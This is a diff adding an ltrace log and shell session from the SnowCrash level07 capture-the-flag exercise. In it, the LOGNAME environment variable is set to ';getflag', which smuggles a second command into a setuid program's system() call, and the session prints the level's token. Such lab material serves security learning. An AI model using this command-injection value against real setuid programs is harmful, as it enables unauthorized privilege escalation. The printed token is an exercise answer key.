@@ -1,0 +1,14 @@
+
+
+getenv("LOGNAME")                                                              = ";getflag"
+asprintf(0xbffff714, 0x8048688, 0xbfffff51, 0xb7e5ee55, 0xb7fed280)            = 19
+system("/bin/echo ;getflag "
+Check flag.Here is your token :
+Nope there is no token here for you sorry. Try again :)
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                         = 0
++++ exited (status 0) +++
+level07@SnowCrash:~$ ./level07
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h  
